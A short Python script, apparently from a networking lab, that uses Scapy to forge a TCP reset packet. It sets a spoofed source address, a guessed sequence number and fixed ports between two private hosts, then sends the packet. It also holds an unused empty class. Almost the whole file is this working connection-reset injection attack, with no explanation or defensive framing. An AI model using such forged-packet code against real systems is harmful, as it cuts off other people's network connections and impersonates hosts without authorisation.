# encoding UTF-8
from scapy.all import *

class block():
    def __init__(self):
        pass
    


if __name__ == "__main__":
    #socket = bolck()
    target_pack = IP()/TCP()
    target_pack.dst = '10.206.7.167'
    target_pack.src = '10.206.7.175'
    target_pack[TCP].seq = 1397397952
    target_pack[TCP].flags = 4
    target_pack.sport = 53066
    target_pack.dport = 5000
    send(target_pack)  
